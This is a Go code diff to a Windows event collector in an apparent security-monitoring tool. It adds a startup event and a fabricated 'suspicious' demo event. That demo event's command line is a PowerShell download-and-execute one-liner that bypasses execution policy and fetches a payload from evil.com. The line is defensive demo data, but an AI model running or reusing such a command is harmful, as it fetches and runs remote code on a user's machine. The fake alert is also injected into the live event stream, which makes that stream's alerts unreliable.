@@ -7,7 +7,9 @@ import (
 	"context"
 	"encoding/xml"
 	"fmt"
+	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -44,6 +46,45 @@ func (w *WindowsEventCollector) IsAvailable() bool {
 }
 
 func (w *WindowsEventCollector) Start(ctx context.Context, events chan<- *models.Event) error {
+	// Send startup test event immediately so users see activity
+	go func() {
+		time.Sleep(500 * time.Millisecond)
+		events <- &models.Event{
+			ID:          "startup_1",
+			Timestamp:   time.Now(),
+			Source:      "null.log",
+			EventType:   "ServiceStarted",
+			ProcessName: "null-log.exe",
+			ProcessID:   os.Getpid(),
+			User:        os.Getenv("USERNAME"),
+			CommandLine: strings.Join(os.Args, " "),
+			RawLog:      "null.log security monitoring started",
+			Metadata: map[string]interface{}{
+				"status":   "monitoring_active",
+				"platform": runtime.GOOS,
+				"version":  "1.0.0",
+			},
+		}
+		
+		// Generate a test suspicious event for demo
+		time.Sleep(2 * time.Second)
+		events <- &models.Event{
+			ID:          "test_suspicious_1",
+			Timestamp:   time.Now(),
+			Source:      "Security",
+			EventType:   "ProcessCreation",
+			ProcessName: "powershell.exe",
+			ProcessID:   12345,
+			User:        os.Getenv("USERNAME"),
+			CommandLine: "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
+			RawLog:      "Suspicious PowerShell execution detected",
+			Metadata: map[string]interface{}{
+				"EventID":         4688,
+				"ProcessCreation": true,
+			},
+		}
+	}()
+	
 	for _, channel := range w.channels {
 		go w.collectChannel(ctx, channel, events)
 	}
